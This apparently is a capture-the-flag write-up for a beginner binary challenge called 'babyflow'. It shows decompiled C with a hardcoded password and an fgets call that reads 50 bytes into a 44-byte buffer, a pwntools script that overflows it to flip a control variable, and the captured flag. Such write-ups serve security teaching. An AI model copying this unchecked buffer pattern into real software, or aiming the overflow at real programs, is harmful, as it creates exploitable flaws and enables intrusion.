---
date: 
tier: 
author: 
platform:
---
# Overview

```
Does this login application even work?!
```

# Reconocimiento

```c
undefined8 main(void)

{
  int correct;
  char password [44];
  int control;
  
  control = 0;
  printf("Enter password: ");
  fgets(password,50,stdin);
  correct = strncmp(password,"SuPeRsEcUrEPaSsWoRd123",0x16);
  if (correct == 0) {
    puts("Correct Password!");
    if (control == 0) {
      puts("Are you sure you are admin? o.O");
    }
    else {
      puts("INTIGRITI{the_flag_is_different_on_remote}");
    }
  }
  else {
    puts("Incorrect Password!");
  }
  return 0;
}
```

# Explotación

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *


exe = context.binary = ELF(args.EXE or 'babyflow')

def start():

    if args.REMOTE:
        return remote("", 1336)
    else:
        return process('./babyflow')

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        PIE enabled
# Stripped:   No

io = start()

payload = "SuPeRsEcUrEPaSsWoRd123"

payload += 100*'A'

io.sendline(payload)

io.interactive()
```

```
[*] Switching to interactive mode
Enter password: Correct Password!
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
```